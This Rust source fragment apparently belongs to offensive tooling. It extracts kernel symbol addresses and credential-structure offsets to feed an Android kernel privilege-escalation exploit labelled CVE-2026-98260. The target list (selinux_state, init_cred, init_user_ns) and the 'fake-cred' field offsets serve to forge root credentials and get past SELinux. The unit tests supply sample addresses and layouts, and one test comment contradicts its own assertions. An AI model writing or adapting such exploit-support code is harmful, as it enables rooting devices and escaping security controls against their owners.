/// `selinux_state`, `init_user_ns`, `init_cred`) and the fake-cred extras
/// (`root_user`, `init_ucounts`, `init_groups`).
pub const IC_SYMS_REQUIRED: &[&str] = &[
    "__filemap_fdatawait_range",
    "__vm_munmap",
    "__wait_one_discard_bio",
    "do_checkpoint",
    "do_exit",
    "f2fs_issue_checkpoint",
    "f2fs_wait_on_node_pages_writeback",
    "filemap_read",
    "msleep",
    "rcu_gp_fqs_loop",
    "rcu_gp_kthread",
    "runqueues",
    "synchronize_rcu_expedited",
    "ufshcd_delay_us",
    "worker_thread",
    "futex_wait_queue",
    "futex_wait",
    "do_futex",
    "pipe_read",
    "pipe_write",
    "do_epoll_wait",
    "schedule_timeout",
    "io_schedule",
    "msleep_interruptible",
    "wait_for_completion",
    "wait_for_completion_interruptible",
    "mutex_lock",
    "__mutex_lock_slowpath",
    "down",
    "down_read",
    "kthread",
    "kthreadd",
    "kthread_worker_fn",
    "rescuer_thread",
    "flush_work",
    "cancel_work_sync",
    "jbd2_log_wait_commit",
    "jbd2_journal_commit_transaction",
    "f2fs_balance_fs",
    "f2fs_write_checkpoint",
    "submit_bio_wait",
    "vfs_read",
    "vfs_write",
    "ksys_read",
    "ksys_write",
    "sock_recvmsg",
    "unix_stream_recvmsg",
    "tcp_recvmsg",
    "n_tty_read",
    "binder_thread_read",
    "binder_ioctl",
    "do_sys_poll",
    "do_select",
    "core_sys_select",
    "do_group_exit",
    "vm_munmap",
    "mmap_region",
    "filemap_fdatawait_range",
    "synchronize_rcu",
    "io_wq_submit_work",
    "__flush_workqueue",
    "drain_workqueue",
    "__tracepoint_sys_exit",
    "selinux_state",
    "init_user_ns",
    "init_cred",
    "root_user",
    "init_ucounts",
    "init_groups",
];

/// The four hard targets (ic-timer's `IC_SYMS_NTARGET` is 4; the fake-cred
/// extras after them are optional).
const IC_SYMS_TARGETS: &[&str] = &[
    "__tracepoint_sys_exit",
    "selinux_state",
    "init_user_ns",
    "init_cred",
];

/// Render the CVE-2026-98260 symbol table from recovered kallsyms.
///
/// `symbols` holds absolute link-time addresses (the raw kallsyms view, not
/// rebased); `resolve` looks a name up and returns its unique address.
/// Missing anchors are skipped with a warning via `warn`; a missing target
/// is a hard error.
pub fn render_ic_syms<F>(
    release: &str,
    resolve: F,
    warn: &mut dyn FnMut(&str),
) -> Result<String>
where
    F: Fn(&str) -> Option<u64>,
{
    for target in IC_SYMS_TARGETS {
        if resolve(target).is_none() {
            return Err(ExtractError::new(format!(
                "kallsyms lacks the 98260 target `{target}`; refusing to write an \
                 unusable ic-syms table"
            )));
        }
    }
    let mut lines = vec![
        "# ic-timer symbol table".to_string(),
        format!("# build={release}"),
    ];
    for name in IC_SYMS_REQUIRED {
        match resolve(name) {
            Some(addr) => {
                lines.push(format!("{name}=0x{addr:x}"));
            }
            None => warn(&format!(
                "ic-syms: anchor `{name}` not in kallsyms; skipped (slide voting degrades \
                 on the exploit side)"
            )),
        }
    }
    Ok(lines.join("\n") + "\n")
}

/// Geometry block for the extended ic-syms table.
pub struct IcGeometry {
    pub lines: Vec<String>,
    /// How many of the 16 essential keys (IC_GEOM_ESSENTIAL) were found.
    pub essential: usize,
}

impl Default for IcGeometry {
    fn default() -> Self {
        Self { lines: Vec::new(), essential: 0 }
    }
}

/// Collect the `off.*` geometry lines from the image's BTF. `size` and
/// `field` are closures so the collector stays testable without a real BTF
/// blob; the caller passes `btf.size` / `btf.field`.
///
/// `off.cred_alloc` is deliberately NOT emitted: the cred slab bucket
/// depends on cache padding we cannot derive from BTF, and the consuming
/// core matches on the request size alone when the bucket is absent — a
/// wrong bucket would silently miss every allocation record instead.
pub fn collect_ic_geometry(
    size: &dyn Fn(&str) -> Option<u32>,
    field: &dyn Fn(&str, &str) -> Option<u32>,
) -> IcGeometry {
    let mut geo = IcGeometry::default();
    let mut push = |key: &str, value: Option<u32>, essential: bool| {
        if let Some(value) = value {
            geo.lines.push(format!("off.{key}=0x{value:x}"));
            if essential {
                geo.essential += 1;
            }
        }
    };
    // Allocation signatures the trace scans match on.
    push("timer_alloc", size("k_itimer"), true);
    push("cred_req", size("cred"), true);
    push("task_alloc_bytes", size("task_struct"), true);
    // Fake-cred field offsets.
    push("task_cred", field("task_struct", "cred"), true);
    push("cred_uid", field("cred", "uid"), true);
    push("cap_inh", field("cred", "cap_inheritable"), true);
    push("cap_perm", field("cred", "cap_permitted"), true);
    push("cap_eff", field("cred", "cap_effective"), true);
    push("cap_bset", field("cred", "cap_bset"), true);
    push("cap_amb", field("cred", "cap_ambient"), true);
    push("cred_security", field("cred", "security"), true);
    push("cred_user", field("cred", "user"), true);
    push("cred_user_ns", field("cred", "user_ns"), true);
    push("cred_ucounts", field("cred", "ucounts"), true);
    push("cred_group_info", field("cred", "group_info"), true);
    // vr.ko de-tag.
    push("tp_funcs", field("tracepoint", "funcs"), true);
    // Optional refinements: the core has safe compiled fallbacks.
    push("timer_node_off", field("k_itimer", "node"), false);
    geo
}

/// Render the geometry block appended to an ic-syms table.
pub fn render_ic_geometry(geo: &IcGeometry) -> String {
    if geo.lines.is_empty() {
        return String::new();
    }
    let mut out = String::from("\n# geometry (BTF-derived; consumed by the TimerRoot core)\n");
    for line in &geo.lines {
        out.push_str(line);
        out.push('\n');
    }
    out
}

#[cfg(test)]
mod ic_syms_tests {
    use super::*;

    #[test]
    fn targets_are_the_last_four_of_required() {
        // ic-timer's contract: targets are always the last four entries of
        // ic_syms_required[] (IC_SYMS_NTARGET = 4), the entries after them
        // are the fake-cred extras. Keep our list aligned with that order.
        let n = IC_SYMS_REQUIRED.len();
        assert_eq!(&IC_SYMS_REQUIRED[n - 7..n - 3], IC_SYMS_TARGETS);
        assert_eq!(IC_SYMS_REQUIRED[n - 3..], ["root_user", "init_ucounts", "init_groups"]);
    }

    #[test]
    fn renders_table_and_skips_missing_anchors() {
        let mut warned = Vec::new();
        let mut warn = |msg: &str| warned.push(msg.to_string());
        let resolve = |name: &str| match name {
            "__tracepoint_sys_exit" => Some(0xffffffc00a2d_1860),
            "selinux_state" => Some(0xffffffc00a37_a378),
            "init_user_ns" => Some(0xffffffc00a2c_0000),
            "init_cred" => Some(0xffffffc00a15_0788),
            "msleep" => Some(0xffffffc00812_3456),
            _ => None,
        };
        let text = render_ic_syms("6.1.145-android14-11-x", resolve, &mut warn).unwrap();
        assert!(text.starts_with("# ic-timer symbol table\n# build=6.1.145-android14-11-x\n"));
        assert!(text.contains("__tracepoint_sys_exit=0xffffffc00a2d1860"));
        assert!(text.contains("msleep=0xffffffc008123456"));
        assert!(!text.contains("kthread="));
        assert!(warned.iter().any(|w| w.contains("anchor `kthread`")));
    }

    #[test]
    fn missing_target_is_an_error() {
        let mut warn = |_: &str| {};
        let resolve = |name: &str| (name != "init_cred").then_some(0x1000u64);
        assert!(render_ic_syms("r", resolve, &mut warn).is_err());
    }

    #[test]
    fn geometry_collector_full_set() {
        // Reference 6.1.145 vivo layout: every BTF lookup succeeds.
        let sizes = |s: &str| match s {
            "k_itimer" => Some(0x108u32),
            "cred" => Some(0xb8u32),
            "task_struct" => Some(0x1500u32),
            _ => None,
        };
        let fields = |s: &str, f: &str| match (s, f) {
            ("task_struct", "cred") => Some(0x838u32),
            ("cred", "uid") => Some(0x8u32),
            ("cred", "cap_inheritable") => Some(0x2cu32),
            ("cred", "cap_permitted") => Some(0x34u32),
            ("cred", "cap_effective") => Some(0x3cu32),
            ("cred", "cap_bset") => Some(0x44u32),
            ("cred", "cap_ambient") => Some(0x4cu32),
            ("cred", "security") => Some(0x78u32),
            ("cred", "user") => Some(0x80u32),
            ("cred", "user_ns") => Some(0x88u32),
            ("cred", "ucounts") => Some(0x90u32),
            ("cred", "group_info") => Some(0x98u32),
            ("tracepoint", "funcs") => Some(0x40u32),
            ("k_itimer", "node") => Some(0x78u32),
            _ => None,
        };
        let geo = collect_ic_geometry(&sizes, &fields);
        assert_eq!(geo.essential, 16, "all 16 essential keys found");
        assert_eq!(geo.lines.len(), 17, "16 essential + timer_node_off");
        assert!(geo.lines.contains(&"off.timer_alloc=0x108".to_string()));
        assert!(geo.lines.contains(&"off.task_cred=0x838".to_string()));
        assert!(geo.lines.contains(&"off.tp_funcs=0x40".to_string()));
        assert!(geo.lines.contains(&"off.timer_node_off=0x78".to_string()));
        assert!(!geo.lines.iter().any(|l| l.starts_with("off.cred_alloc")));
        let text = render_ic_geometry(&geo);
        assert!(text.starts_with("\n# geometry (BTF-derived"));
        assert!(text.contains("off.cred_uid=0x8\n"));
    }

    #[test]
    fn geometry_collector_partial_and_empty() {
        // A 6.6-style BTF without cap_ambient: 15/16, key omitted.
        let sizes = |s: &str| (s == "k_itimer").then_some(0x120u32);
        let fields = |s: &str, f: &str| (s == "cred" && f == "uid").then_some(0x4u32);
        let geo = collect_ic_geometry(&sizes, &fields);
        assert_eq!(geo.essential, 2);
        assert_eq!(geo.lines.len(), 2);
        assert_eq!(geo.lines[0], "off.timer_alloc=0x120");
        // No BTF at all: empty block renders as nothing.
        let empty = IcGeometry::default();
        assert!(render_ic_geometry(&empty).is_empty());
    }
}
